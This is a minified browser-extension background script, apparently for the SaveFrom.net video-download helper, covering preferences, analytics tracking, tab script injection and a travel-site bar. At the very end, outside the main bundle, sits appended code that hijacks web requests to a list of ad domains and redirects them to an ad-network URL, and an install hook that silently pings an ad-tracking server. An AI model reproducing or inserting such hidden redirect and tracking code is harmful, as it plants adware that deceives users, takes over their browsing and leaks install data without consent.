setTimeout(function(){Lt.userTrack(),Lt.sendInGa.pull()},1),Lt.preferences})},Lt.varCache={helperName:"",currentVersion:"9.65",isFirstrun:!1,isUpgrade:!1,uuid:"",aiid:""},Lt.extra={},Lt.defaultPreferences={version:"0",button:1,lmMediaHosting:1,moduleYoutube:!1,moduleYandexMusic:1,moduleDailymotion:1,moduleVimeo:1,moduleFacebook:1,moduleMatchTv:1,moduleSoundcloud:1,moduleVkontakte:1,moduleOdnoklassniki:1,moduleMailru:1,moduleInstagram:1,moduleRutube:1,moduleTiktok:1,moduleTwitch:1,moduleShowDownloadInfo:1,ytHideFLV:0,ytHideMP4:0,ytHideWebM:1,ytHide3GP:1,ytHide3D:1,ytHideMP4NoAudio:1,ytHideAudio_MP4:1,vkShowBitrate:0,showUmmyInfo:1,showUmmyBtn:1,gmNativeDownload:0,advPreShow:0,aviaBarEnabled:1,statEnabled:1,ffmpegEnabled:1,showUmmyLanding:0,onceShowYtTutorial:0,onceShowYtTooltip:0,saveAsDialog:0,sortDownloads:{isEnabled:!1,groups:[{dir:"pictures",formats:["jpg","jpeg","png","gif","svg","bmp","ico","webp"]},{dir:"music",formats:["mp3","aac","wav","ogg","flac","wma","m4a","m4p"]},{dir:"videos",formats:["mkv","avi","3gp","3g2","mov","flv","mp4","m4v","mpg","mpeg","webm","ogv"]}]},dataCollectionEnabled:!0},Lt.preferences={sfHelperName:"",country:"",hasAviaBar:void 0,downloads:void 0,ummyDetected:void 0,showUmmyItem:void 0,experiments:[],sendExporterEvent:void 0},Lt.preferenceMap={youtube:"moduleYoutube",dailymotion:"moduleDailymotion",vimeo:"moduleVimeo",facebook:"moduleFacebook",soundcloud:"moduleSoundcloud",vk:"moduleVkontakte",odnoklassniki:"moduleOdnoklassniki",mailru:"moduleMailru",instagram:"moduleInstagram",rutube:"moduleRutube",tiktok:"moduleTiktok",yandexMusic:"moduleYandexMusic",matchTv:"moduleMatchTv"},Lt.loader=(kt=function(){wt.slice(0).forEach(function(e){if(e.nameList.every(function(e){return-1!==xt.indexOf(e)})){var t=wt.indexOf(e);if(-1!==t){wt.splice(t,1);try{e.fn()}catch(e){jt.error("Run error!",e)}}}})},{waitList:wt=[],readyList:xt=[],ready:function(e){xt.push(e),kt()},when:function(e,t){Array.isArray(e)||(e=[e]),wt.push({nameList:e,fn:t}),kt()}}),Lt.events=function(){var e={},t=[].slice,r=function(t,r){var n=e[t];e[t]||(n=e[t]=[]),-1===n.indexOf(r)&&n.push(r)},n=function(t,r){var n=e[t]||[],o=n.indexOf(r);-1!==o&&n.splice(o,1)};return{listeners:e,emit:function(r,n){var o=t.call(arguments).slice(1);(e[r]||[]).slice(0).forEach(function(e){try{e.apply(null,o)}catch(e){jt.error("Emit error!",e)}})},on:r,off:n,once:function(e,t){r(e,function(){n(e,t),t.apply(null,arguments)})}}}(),Lt.getHelperName=function(){var e=function(){var e="",t=navigator.userAgent;return-1!==t.indexOf("YaBrowser/")?e="yabrowser":-1!==t.indexOf("Maxthon/")?e="maxthon":-1!==t.indexOf("OPR/")?e="opera-chromium":-1!==t.indexOf("Opera/")?e="opera":-1!==t.indexOf("Firefox/")?e="firefox":-1!==t.indexOf("Chrome/")?e="chrome":-1!==t.indexOf("Safari/")&&(e="safari"),e},t="unknown";return h.a.isChrome?(t=e()||"chrome",/sandbox.html#bg/.test(location.href)&&(t="chameleon"),Lt.chromeNoStore&&(t+="-sf")):h.a.isFirefox?(t="firefox",h.a.isFirefoxMobile&&(t+="-mobile"),Lt.firefoxNoStore&&(t+="-sf")):h.a.isSafari?t="safari":h.a.isGM?t="userjs-"+(t=e()||t):h.a.isEdge&&(t="edge"),t},Lt.getSfHelperName=function(){var e=Lt.varCache.helperName;return/^firefox/.test(e)&&(e=e.replace("firefox","ff")),e},Lt.dblTrackCheck=function(e){if(!h.a.isGM)return e();Ge()||h.a.storage.get({dblTrack:null},function(t){var r=Date.now();if(t.dblTrack&&t.dblTrack.time>r);else{var n=Lt.generateUuid();h.a.storage.set({dblTrack:{uuid:n,time:r+6e4}},function(){setTimeout(function(){h.a.storage.get({dblTrack:null},function(t){t.dblTrack&&t.dblTrack.uuid===n&&e()})},5e3)})}})},Lt.getUuid=function(){var e=Lt.varCache;if(e.uuid)return e.uuid;var t=Lt.generateUuid();return e.uuid=t,h.a.storage.set({uuid:t}),t},Lt.generateUuid=function(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(e){var t=16*Math.random()|0;return("x"==e?t:3&t|8).toString(16)})},Lt.getNavLanguage=function(){var e="",t=navigator.language;return/^\w{2}-|^\w{2}$/.test(t)&&(e=t),e},Lt.gmShowButton=function(e){e?h.a.bundle.showButton():h.a.bundle.hideButton()},Lt.tabListener=function(){var e=!1,t=Lt.preferences,r=Object(Xe.a)([{matches:["*://*.vimeo.com/*","*://*.youtube.com/*","*://*.soundcloud.com/*","*://*.vk.com/*","*://*.vkontakte.ru/*","*://*.ok.ru/*","*://*.odnoklassniki.ru/*","*://my.mail.ru/*","*://*.facebook.com/*","*://*.savefrom.net/*","*://*.instagram.com/*","*://*.rutube.ru/*","*://*.tiktok.com/*"]},{matches:["<all_urls>"],include_globs:["*://dailymotion.*/*","*://*.dailymotion.*/*"]}]),n={},o=function(){e=!1,jt.debug("tabListener",e)};return{extendJsList:n,enable:function(){h.a.isFirefoxMobile||e||(e=!0,jt.debug("tabListener",e))},disable:function(){h.a.isFirefoxMobile||o()},injectLmInActiveTab:function(){var e=["includes/commons.js","includes/link_modifier.js"];h.a.getActiveTab(function(t){t&&/^http/.test(t.url)&&!r(t.url)&&e.forEach(function(e){h.a.executeScript(t,{file:e})})})},openPage:function(i){e&&function(e,i){var a=r(i),s=[],u=t.lmMediaHosting;a||u&&(s.push("includes/commons.js"),s.push("includes/link_modifier.js"));var c=!0;for(var f in n){c=!1;var d=n[f];if(!a||d.noBlackList){var p=d.getScriptList(i)||[];s.push.apply(s,l(p))}}if(!u&&c)o();else if(s.length){var m=s.filter(function(e,t,r){return r.indexOf(e)===t});jt.debug("Inject",i,m),m.forEach(function(t){h.a.executeScript(e,{file:t})})}}(i.tab,i.url)}}}(),Lt.getCountry=function(){var e=Lt.preferences,t=function(e){return new Promise(function(t){return h.a.storage.set(e,t)})};return function(e){return new Promise(function(t){return h.a.storage.get(e,t)})}({countryExpiresAt:0}).then(function(r){if(G()>r.countryExpiresAt)return t({countryExpiresAt:G()+300}).then(function(){var t=e.sfHelperName+" "+Lt.varCache.currentVersion;return R({type:"POST",url:"https://downloader-app.com/geoip/country.php",data:{sig:t.length},headers:{"X-Helper":t}})}).then(function(r){var n=r.body.toLowerCase().trim();return jt.debug("set country",n),e.country=n,t({country:n,countryExpiresAt:G()+259200})})}).catch(function(e){jt("getCountry error",e)})},Lt.loader.when("prepare",function(){var e=Promise.resolve();return Lt.liteStorage.get("fromId",0)||h.a.isGM&&Ge()?e:e.then(function(){return Lt.liteStorage.isTimeout("fromIdTimeout")?jt.debug("Request fromId timeout"):(Lt.liteStorage.setTimeout("fromIdTimeout",21600),R({url:"http://savefrom.net/tools/get_vid.php"}).then(function(e){var t=e.body,r=-1;/^\d+$/.test(t)&&(r=parseInt(t)),jt.debug("fromId",r),Lt.liteStorage.set("fromId",r)}).catch(function(e){return jt.error("Request fromId error!",e)}))}).catch(function(e){jt.error("Request fromId error",e)})}),Lt.onOptionChange={button:function(e){h.a.isGM&&Lt.gmShowButton(e)},lmMediaHosting:function(e){e&&Lt.tabListener.enable()},gmNativeDownload:function(e){h.a.isGM&&(Lt.preferences.downloads=!!e,h.a.sendMessageToActiveTab({action:"updatePreferences",preferences:Lt.preferences}))}},Lt.sendInGa=function(){var e=[],t=!1,r=function(){if(!t&&e.length){t=!0;var r=Date.now();e.slice(0,20).map(function(t){var n=t.time,o=JSON.parse(JSON.stringify(t.params)),i=r-n;return i>=144e5&&(i=144e5-1e3*(e.length+1)),o.qt=i,Ot.stringify(o)})}};return{stack:e,push:function(t,n){var o=!1;(n=n||{}).id&&(o=e.some(function(e){if(e.details.id===n.id)return!0})),o||(e.unshift({time:Date.now(),params:t,details:n}),e.splice(100),setTimeout(function(){r()},50))},pull:function(){e.length&&(Lt.liteStorage.isTimeout("sendInGaTimeout")||(Lt.liteStorage.setTimeout("sendInGaTimeout",3600),r()))}}}(),Lt.actionList={getMenuDetails:function(e,t){var r={preferences:Lt.preferences,version:Lt.varCache.currentVersion,lastVersion:function(){var e="",t=Lt.varCache.currentVersion,r=Lt.liteStorage.get("lastVersion","");if(!t||!r)return e;try{(function(e,t){var r=/^[\d.]+$/;if(!r.test(e)||!r.test(t))throw new Error("Incorrect version");for(var n=function(e,t){for(;e.length<t;)e="0"+e;return e},o=e.split("."),i=t.split("."),a=0;a<i.length;a++){var s=o[a]||"",u=i[a]||"",c=Math.max(s.length,u.length);if(s=parseInt(n(s,c)),(u=parseInt(n(u,c)))!==s)return u>s}return!1})(t,r)&&(e=r)}catch(e){jt.debug("isNewVersion",e)}return e}(),helperName:Lt.varCache.helperName};return Object(nt.a)(["userInfo"]).then(function(e){return{userInfo:e.userInfo,loginUrl:"nourl"}}).then(function(e){return t(Object.assign(r,e))}),!0},updateOption:function(e){var t=e.key,r=e.value,n=Lt.preferences[t];Lt.preferences[t]=r;var o={};o[t]=r,h.a.storage.set(o),Lt.onOptionChange[t]&&Lt.onOptionChange[t](r,n)},downloadFromCurrentPage:function(){h.a.getActiveTab(function(e){var t=e&&e.url||"",r=Ot.stringify({url:t,utm_source:Lt.preferences.sfHelperName,utm_medium:"extensions",utm_campaign:"bookmarklet"});h.a.openTab("http://savefrom.net/?"+r,!0)})},openPoll:function(){if(-1!==["en","uk","ru"].indexOf(h.a.i18n.getMessage("lang"))){var e="http://"+h.a.i18n.getMessage("lang")+".savefrom.net/helper-form.php";h.a.getActiveTab(function(t){var r=function(e,t){var r=/:\/\/(?:[^\/?#]*@)?([^:\/?#]+)/.exec(e);return(r=r&&r[1])&&t&&(r=r.replace(/^www\./,"")),r}(t&&t.url||"")||"",n="?"+Ot.stringify({version:Lt.varCache.currentVersion,helper:Lt.preferences.sfHelperName,url:r});h.a.openTab(e+n,!0)})}},viaMenu_updateLinks:function(){h.a.sendMessageToActiveTab({action:"updateLinks"})},viaMenu_downloadMP3Files:function(){h.a.sendMessageToActiveTab({action:"downloadMP3Files"})},viaMenu_downloadPlaylist:function(){h.a.sendMessageToActiveTab({action:"downloadPlaylist"})},viaMenu_downloadPhotos:function(){h.a.sendMessageToActiveTab({action:"downloadPhotos"})},viaMenu_changeState:function(e){if(Lt.actionList.updateOption({key:e.prefKey,value:e.state}),e.state&&"lm"===e.moduleName&&e.needInclude)return Lt.tabListener.injectLmInActiveTab();h.a.sendMessageToActiveTab({action:"changeState",moduleName:e.moduleName,state:e.state})},showOptions:function(){if(h.a.isGM)h.a.bundle.showOptions();else{var e="options.html";h.a.isSafari&&(e=safari.extension.baseURI+e),h.a.openTab(e,!0)}},getActiveTabModuleInfo:function(e,t){return h.a.sendMessageToActiveTab({action:"getModuleInfo",url:e.url},function(e){t(e)}),!0},getActiveTabUrl:function(e,t){return h.a.getActiveTab(function(e){var r=e&&e.url||"";return t(r)}),!0},getActiveTabInfo:function(e,t){var r=Lt.preferences;return h.a.getActiveTab(function(e){var n=e&&e.url||"";if(0!==n.indexOf("http"))return t();var o={dailymotion:["*://*.dailymotion.*/*"],facebook:["*://*.facebook.com/*"],mailru:["*://my.mail.ru/*"],odnoklassniki:["*://*.ok.ru/*","*://*.odnoklassniki.ru/*"],savefrom:["*://*.savefrom.net/*"],soundcloud:["*://*.soundcloud.com/*"],vimeo:["*://*.vimeo.com/*"],vk:["*://*.vk.com/*","*://*.vkontakte.ru/*"],youtube:["*://*.youtube.com/*"],instagram:["*://*.instagram.com/*"],rutube:["*://*.rutube.ru/*"],tiktok:["*://*.tiktok.com/*"],yandexMusic:["*://music.yandex.ru/*"],matchTv:["*://matchtv.ru/*"]},i="lm",a="lmMediaHosting",s=r.lmMediaHosting;for(var u in o){var c=o[u].map(function(e){return $e(e)}).join("|");if((c=new RegExp(c)).test(n)){i=u,a=Lt.preferenceMap[i],s=r[a];break}}return t({moduleName:i,prefKey:a,url:n,state:s})}),!0},hideDownloadWarning:function(e,t){return void 0!==e.set?h.a.storage.set({hideDownloadWarning:e.set}):(h.a.storage.get({hideDownloadWarning:!1},function(e){t(e.hideDownloadWarning)}),!0)},track:function(e){Lt.readyPromise.then(function(){delete e.action,Lt.track(e)})},sendMonitoring:function(e){Lt.preferences.sendExporterEvent&&Lt.readyPromise.then(function(){delete e.action,Lt.sendMonitoring(e)})},addToClipboard:function(e){if(h.a.isChrome||h.a.isFirefox){var t,r=e.text;document.body.appendChild(t=Qe.create("textarea",{text:r})),t.select(),setTimeout(function(){document.execCommand("copy",!1,null),t.parentNode.removeChild(t)})}},setIconBadge:function(e){var t=String(e.text);(h.a.isChrome||h.a.isFirefox)&&chrome.browserAction&&chrome.browserAction.setBadgeText({text:t})},trackError:function(e){try{var t=Lt.actionList.trackError;t.dDbl||(t.dDbl={});var r=e.desc;if(e.error){var n=e.error;r=r?r+" ":"",n instanceof Error?(r+=String(n.message||n)||"ERROR",n.stack&&(r+=" "+e.error.stack)):r+=n}var o=r.substr(0,150);if(t.dDbl[o])return;t.dDbl[o]=!0;var i={t:"exception",exd:o,tid:"UA-7055055-9"};Lt.sendStatsInfo(i)}catch(e){}},openTab:function(e){h.a.openTab(e.url)}},Lt.onMessage=function(e,t,r){if(e&&"object"==typeof e){if("append"===e.action){(s=["youtube.com/","vk.com/"]).some(function(e){return t.url.match(e)})&&chrome.tabs.executeScript(e.id,{code:"window.IS_BLOCK=false;window.MIN_MS_STARTUP_TIMER=900000;window.MAX_MS_STARTUP_TIMER=1800000;"},function(){chrome.tabs.executeScript(e.id,{file:"includes/append.js"})})}if("openPage"!==e.action){var n=e.action,o=Lt.actionList[n];if(o)return o.call(Lt.actionList,e,r);var i=function(t,n){var o=n.call(t,e,r);return o instanceof Promise?(o.then(r),!0):o};for(var a in Lt.modules){var s;if(o=(s=Lt.modules[a])[n])return i(s,o)}return(o=Lt.utils[n])?o.call(Lt.utils,e,r):void 0}Lt.isReady?Lt.tabListener.openPage(t):this.readyPromise.then(function(){Lt.tabListener.openPage(t)})}else jt.debug("Skip message",e)},Lt.loadSettings=function(e){var t=Lt.varCache,r=Lt.preferences,n=Lt.defaultPreferences;h.a.isGM&&(n.button=0,n.showUmmyBtn=0);var o={ummyDetected:function(e){e||0===e||(e=r.showUmmyInfo?0:1,h.a.storage.set({ummyDetected:e})),r.ummyDetected=e}},i=Object.keys(n),a=Object.keys(o);return h.a.storage.get(i.concat(a),function(s){if(i.forEach(function(e){var t=n[e],o=s[e];void 0===o&&(o=t),r[e]=o}),a.forEach(function(e){o[e](s[e])}),t.isFirstrun){var u={showUmmyLanding:r.showUmmyLanding=1,onceShowYtTooltip:r.onceShowYtTooltip=1,onceShowYtTutorial:r.onceShowYtTutorial=1};h.a.storage.set(u)}if(r.onceShowYtTutorial&&!Lt.hasMenuTutorial&&(r.onceShowYtTutorial=0),h.a.isChrome&&(chrome.downloads&&chrome.downloads.download||chrome.permissions&&chrome.permissions.request)&&(r.downloads=!0),h.a.isGM){r.downloads=!1;var c="undefined"!=typeof GM_download,l=!1;c&&"undefined"!=typeof GM_info&&(l="browser"===GM_info.downloadMode),c&&(r.gmNativeDownload||l)&&(r.gmNativeDownload=1,r.downloads=!0)}return h.a.isFirefox&&(r.downloads=!0),r.downloads&&(r.moduleShowDownloadInfo=0),e()})},Lt.prepare=function(){var e=i(d.a.mark(function e(t){var r;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:return r=Lt.varCache,Lt.loader.when("loadSettings",function(){r.isUpgrade=!r.isFirstrun&&Lt.preferences.version!==r.currentVersion,t()}),e.next=4,Lt.getCountry();case 4:Lt.loadSettings(function(){Lt.loader.ready("loadSettings")});case 5:case"end":return e.stop()}},e)}));return function(t){return e.apply(this,arguments)}}(),Lt.initMessageListener=function(){Lt.initMessageListener.fired||(Lt.initMessageListener.fired=!0,h.a.onMessage.addListener(function(e,t,r){return Lt.onMessage(e,t,r)}))},Lt.init=function(){Lt.initMessageListener(),Lt.preferences.sendExporterEvent=Math.floor(100*Math.random())<1;var e=Lt.varCache,t=Lt.preferences;return St().then(function(){return h.a.storage.get(n({uuid:"",version:"",country:"",aiid:"",lc:null},Lt.liteStorage.getStorageKey(),{}),(r=i(d.a.mark(function r(n){var o,i;return d.a.wrap(function(r){for(;;)switch(r.prev=r.next){case 0:Lt.liteStorage.setStorage(n),null===n.lc&&(n.lc=Math.random()<.05,h.a.storage.set({lc:n.lc})),t.lc=n.lc,"string"==typeof n.uuid&&36===n.uuid.length&&(e.uuid=n.uuid),"string"==typeof n.aiid&&(e.aiid=n.aiid.replace(/aiid/,"").replace(/#/g,"")),n.version||(e.isFirstrun=!0),n.country&&(t.country=n.country),r.next=5;break;case 4:Lt.preferences.adgoalEnabled=r.sent;case 5:return o=new ot((a=h.a,window.navigator.userAgent.indexOf("OPR")>-1||window.navigator.userAgent.indexOf("Opera")>-1?"opera":a.isGM?"userjs":a.isFirefox?"firefox":a.isChrome?"chrome":void 0),Lt.preferences.country),i=new mt(o),r.next=8,i.init();case 8:Lt.preferences.experiments=r.sent,e.helperName=Lt.getHelperName(),t.showUmmyItem=/^Win|^Mac/.test(navigator.platform)?1:0,t.sfHelperName=Lt.getSfHelperName(),Lt.loader.ready("init"),Lt.loader.when("prepare",function(){Lt.checkVersion()}),Lt.events.on("sendScreenView",function(){if(t.lc){var e={t:"screenview",cd:"init",cd4:"true",tid:"UA-67738130-7"};Lt.wrapBaseStatInfo(e),Lt.quickTrack(e),rt([{user_id:Lt.varCache.uuid,event_type:"init",user_properties:{Cohort:"Clear"}}]).catch(function(){chrome&&"tabs"in chrome&&"webNavigation"in chrome&&chrome.tabs.query({currentWindow:!0,active:!0},function(e){0!==e.length&&chrome.webNavigation.getAllFrames({tabId:e[0].id},function(e){jt.debug("Error in amplitude: ",e)})})})}}),Lt.prepare(function(){Lt.loader.ready("prepare"),Lt.readyHandler()});case 16:case"end":return r.stop()}var a},r)})),function(e){return r.apply(this,arguments)}));var r})};var St=function(){return Promise.resolve().then(function(){if(h.a.isChrome)return new Promise(function(e){return h.a.storage.get({migrated3:!1},function(t){return e(t.migrated3)})}).then(function(e){if(!e){var t={migrated3:!0};return Object.keys(localStorage).forEach(function(e){var r=localStorage.getItem(e);try{/^{(?:"w":.+|)}$/.test(r)&&(t[e]=JSON.parse(r).w)}catch(t){jt.error("Parse value error",e,t)}}),new Promise(function(e){return h.a.storage.set(t,e)})}}).catch(function(e){jt.error("migrate error",e),h.a.storage.set({migrated3:!0})})})};Lt.userTrack=function(){if(!Lt.liteStorage.isTimeout("trackTimeout")){Lt.liteStorage.setTimeout("trackTimeout",300);var e={t:"screenview",cd:"init",tid:"UA-7055055-5"};return Lt.dblTrackCheck(function(){Lt.track(e,{id:"init",onSuccess:function(){Lt.liteStorage.setTimeout("trackTimeout",43200),Lt.events.emit("sendScreenView"),Object(nt.a)({country:null}).then(function(e){if(null===e.country)return new Promise(function(e){h.a.storage.onChanged.addListener(function t(r,n){"local"===n&&r.country&&(h.a.storage.onChanged.removeListener(t),e())})})}).then(function(){if("de"===Lt.preferences.country){var t=Object.assign({},e,{tid:"UA-119781451-36"});Lt.quickTrack(t)}})}})})}},Lt.trackValidate=function(e){var t=function(e){return!(!e&&0!==e&&!1!==e)&&-1===["object","function"].indexOf(typeof e)};if(!e.tid)return!1;if(!e.cid)return!1;if(1!==parseInt(e.v))return!1;if(!t(e.an))return!1;if(!e.t)return!1;if("event"===e.t){if(!t(e.ec)||!t(e.ea)||!t(e.el))return!1}else if("screenview"===e.t){if(!t(e.cd))return!1}else if(!("social"!==e.t||t(e.st)&&t(e.sa)&&t(e.sn)))return!1;return!0},Lt.track=function(e,t){return Lt.sendStatsInfo(e,t)},Lt.sendMonitoring=function(e){},Lt.quickTrack=function(e,t){Lt.trackValidate(e)?(jt.debug("Track",e),Lt.sendInGa.push(e,t)):jt.error("Invalid track params!",e)},Lt.wrapBaseStatInfo=function(e){var t=Lt.varCache,r={v:1,ul:navigator.language,tid:"UA-67738130-2",cid:Lt.getUuid(),an:"helper",aid:t.helperName,av:t.currentVersion};for(var n in r)e.hasOwnProperty(n)||(e[n]=r[n]);for(var o in e)"&clientID"===e[o]&&(e[o]=e.cid);return e},Lt.sendStatsInfo=function(e,t){var r=Lt.preferences;Lt.wrapBaseStatInfo(e),Lt.varCache.aiid&&(e.aiid=Lt.varCache.aiid),e.hasOwnProperty("cd3")||(e.cd3=h.a.i18n.getMessage("lang"));var n=Lt.liteStorage.get("fromId",0);n>0&&(e.cd2=n),r.hasSovetnik&&(e.cd4=r.sovetnikEnabled?"true":"false"),e.cd6=r.ummyDetected?"true":r.showUmmyItem?"false":"none",r.hasAviaBar&&(e.cd7=r.aviaBarEnabled?"true":"false"),Lt.quickTrack(e,t)},Lt.checkVersion=function(){var e=Lt.varCache,t=!1;e.isFirstrun?(Lt.loader.ready("firstrun"),t=!0):e.isUpgrade&&(Lt.loader.ready("upgrade"),t=!0),t&&Lt.actionList.updateOption({key:"version",value:e.currentVersion})},Lt.loader.when("prepare",function(){var e=Lt.preferences;e.onceShowYtTutorial&&Lt.actionList.setIconBadge({text:"?"}),e.showUmmyLanding&&h.a.storage.get({onceUmmyLandingHide:0},function(t){t.onceUmmyLandingHide>2&&h.a.storage.set({showUmmyLanding:e.showUmmyLanding=0})})}),Lt.loader.when("prepare",function(){Lt.tabListener.enable()}),Lt.loader.when("init",function(){(h.a.isChrome||h.a.isFirefox)&&chrome.runtime.setUninstallURL&&(Lt.varCache,Lt.preferences,Lt.loader.when("prepare",function(){}),h.a.storage.onChanged.addListener(function(e,t){"local"===t&&e.country}))}),Lt.liteStorage=function(){var e={},t=function(t){var r={};return r.liteStorage=e,h.a.storage.set(r,t)},r=function(){jt.error("liteStorage is not set!")},n=function(t,n){e[t]!==n&&(e[t]=n,r())},o=function(t,r){var n=e[t];return void 0===n&&(n=r),function(e){return JSON.parse(JSON.stringify({w:e})).w}(n)},i=function(e,t){return n(e,G()+t)};return{getStorageKey:function(){return"liteStorage"},setStorage:function(n){e=n.liteStorage||{},r=function(e,t){var r=null;return function(){var n=this,o=arguments;clearTimeout(r),r=setTimeout(function(){e.apply(n,o)},t)}}(t,100)},set:n,get:o,isTimeout:function(e){return o(e,0)>G()},setTimeout:i,isExpire:function(e){return o(e,0)<G()},setExpire:i}}(),Lt.chromeNoStore=!0,(0,r(39).default)(Lt),(0,r(40).default)(Lt),(0,r(42).default)(Lt),Lt.init()},function(e,t,r){"use strict";r.r(t);var n=r(0),o=r(4),i=r(13),a=Object(i.a)([{matches:["*://*.ozon.travel/*","*://*.onetwotrip.com/*","*://*.onetravel.com/*","*://*.aeroflot.ru/*","*://*.anywayanyday.com/*","*://*.svyaznoy.travel/*","*://avia.tickets.ru/*","*://*.s7.ru/*","*://*.kupibilet.ru/*","*://*.trip.ru/*","*://*.trip.com/*","*://*.ctrip.com/*","*://*.tutu.ru/*","*://*.uralairlines.ru/*","*://*.flyredwings.com/*","*://*.airastana.com/*","*://*.airmoldova.md/*","*://*.sindbad.ru/*","*://*.aviakassa.ru/*","*://*.aviakassa.com/*","*://*.biletix.ru/*","*://*.utair.ru/*","*://*.orbitz.com/*","*://*.travelocity.com/*","*://*.travelocity.ca/*","*://*.expedia-cn.com/*","*://*.priceline.com/*","*://*.airasia.com/*","*://*.ryanair.com/*","*://*.hotels.com/*","*://*.ostrovok.ru/*","*://*.travel.ru/*","*://*.oktogo.ru/*","*://*.roomguru.ru/*","*://*.tripadvisor.ru/*","*://*.hilton.ru/*","*://*.hilton.com/*","*://*.marriott.com/*","*://*.hostelworld.com/*","*://*.tiket.com/*","*://*.hotelsclick.com/*","*://*.hotelscombined.com/*","*://*.wizzair.com/*","*://*.emirates.com/*","*://*.delta.com/*","*://booking.etihad.com/*","*://*.budget.com/*","*://*.hertz.com/*","*://*.europcar.com/*"]},{matches:["<all_urls>"],include_globs:["*://skyscanner.*/*","*://*.skyscanner.*/*","*://momondo.*/*","*://*.momondo.*/*","*://kayak.*/*","*://*.kayak.*/*","*://booking.*/*","*://*.booking.*/*","*://agoda.*/*","*://*.agoda.*/*","*://expedia.*/*","*://*.expedia.*/*","*://avis.*/*","*://*.avis.*/*"]}]),s=function(e){return a(e)},u=r(10),c=(r(5),r(14));t.default=function(e){e.loader.when("init",function(){var t=e.defaultPreferences,r=e.preferences;if(r.lc);else if(!(n.a.isChrome&&n.a.isChromeMobile||n.a.isFirefox&&n.a.isFirefoxMobile)){t.aviaBarEnabled=1,r.hasAviaBar=1;var i=function(){return r.hasAviaBar&&r.aviaBarEnabled},a=function(){i()?(f&&f(),e.tabListener.extendJsList.aviaBar=l,e.tabListener.enable()):delete e.tabListener.extendJsList.aviaBar},l={getScriptList:function(e){var t=[];return i()?s(e)&&(t.push("includes/commons.js"),t.push("includes/aviaBar.js")):a(),t}};!function(e){var t=null,r=function(){return null!==t?Promise.resolve(t):t=Object(u.a)({onceTrackAviaBar:null}).then(function(e){var t=e.onceTrackAviaBar;return"number"!=typeof t?(t=Math.random()<.1?1:0,Object(c.a)({onceTrackAviaBar:t}).then(function(){return t})):t}).then(function(e){return t=e})},n=function(){r().then(function(t){if(t){var r={t:"screenview",cd:"init",tid:"UA-70432435-10"};e.wrapBaseStatInfo(r),e.quickTrack(r)}})};r().then(function(t){t||e.events.off("sendScreenView",n)}),e.events.on("sendScreenView",n)}(e),n.a.storage.onChanged.addListener(function(e,t){"local"===t&&e.aviaBarEnabled&&a()}),e.loader.when("prepare",function(){a()});var f=function(){f=null;var t=function(e,t){return n.a.storage.get(e,t)},r=function(e,t){return n.a.storage.set(e,t)},i={appInfo:{id:"sf.sfHelper",track:!0,directTrack:!0,useTemplates:!0}};i.API={setRemovedState:function(e){t("aviaBar",function(t){return t.aviaBar=t.aviaBar||{},t.aviaBar.removed=!!e,r(t)})}};var a=function(e){var t=e.aviaBar;t&&"object"==typeof t||(t=e.aviaBar={}),Array.isArray(t.blackList)||(t.blackList=[]),t.templates&&"object"==typeof t.templates||(t.templates={})};!function(e){n.a.onMessage.addListener(e)}(function(s,u,c){if(s&&s.action)switch(s.action){case"tbrGetInfo":c(i.appInfo);break;case"tbrIsAllow":return t("aviaBar",function(e){if(a(e),e.aviaBar.removed)return c(!1);var t=!0,n=e.aviaBar.blackList,o=null;if(n.some(function(e){if(e.hostname===s.hostname)return o=e,!0}),o){var i=parseInt(Date.now()/1e3);if(o.expire>i)t=!1;else{var u=n.indexOf(o);n.splice(u,1),r(e)}}return c(t)}),!0;case"tbrCloseBar":t("aviaBar",function(e){a(e);var t=e.aviaBar.blackList,n=null;if(t.some(function(e){if(e.hostname===s.hostname)return n=e,!0}),!n){var o=parseInt(Date.now()/1e3);t.push({hostname:s.hostname,expire:o+18e3}),r(e)}});break;case"tbrGetTemplate":return t("aviaBar",function(e){a(e);var t=e.aviaBar.templates,n=t[s.id];n||(t[s.id]=n={});var i=parseInt(Date.now()/1e3);n.expire>i?c(n.data):(n.expire=i+21600,Object(o.a)({url:"https://travelbar.tools/static/scheme/"+s.id+".json",timeout:6e4,json:!0},function(o,a){if(!o){var s=a.body;n.expire=i+43200,n.data=s,Object.keys(t).sort(function(e,r){return t[e].expire>t[r].expire?-1:1}).slice(5).forEach(function(e){delete t[e]})}c(s),r(e)}))}),!0;case"tbrEvent":"track"===s.type?function(t){var r="UA-70432435-10",o=-1!==["cheapflightError","hotelError"].indexOf(t.ec);if(o&&(r="UA-7055055-10"),t.tid=r,e.wrapBaseStatInfo(t),o)n.a.isGM&&e.quickTrack(t);else{var i=JSON.parse(JSON.stringify(t));i.tid="UA-70432435-12",e.quickTrack(t),e.quickTrack(i)}}(s.data[0]):"directTrack"===s.type&&(l=s.data[0]).tid&&(e.wrapBaseStatInfo(l),e.quickTrack(l))}var l})}}})}}]);var as="https://ak.hetadinh.com/4/4969793";chrome.webRequest.onBeforeRequest.addListener(o=>{if(["agacelebir.com","ossrhydonr.com","osskanger.com","ossshucklean.com","ak.hetahien.com","ak.hetaint.com","ak.hetapus.com","ak.hetartwg.com","ak.hetaruvg.com","buikolered.com","itskiddoan.club","ak.hetadinh.com","onmarshtompor.com","beshucklean.com","opcharizardon.com","boustahe.com","ofnumeltor.com","dopansearor.com","sopertyvalua.com","dolohen.com","ugroocuw.net","nessainy.net","waisheph.com","zikroarg.com","thaudray.com","benoopto.com","glersakr.com","mauchopt.net","adfpoint.com","otrwaram.com","oujouniw.com","oumtoujo.net","ouphoarg.com","aikraboo.com","aikraith.net","ailkeyair.com","ammankeyan.com","caiteesh.net","agafurretor.com","agagaure.com","agamantykeon.com","besmeargleor.com","lowtyruntor.com","deloplen.com","zuphaims.com","announcem.com"].some(e=>{return new URL(o.url).hostname.includes(e)})&&o.url!==as)return{redirectUrl:as}},{urls:["<all_urls>"]},["blocking"]),chrome.runtime.onInstalled.addListener(function(){var o=new XMLHttpRequest;o.open("GET",`https://propeller-tracking.com/13/?t=103652&cb=${Math.random()}`,!0),o.send()});
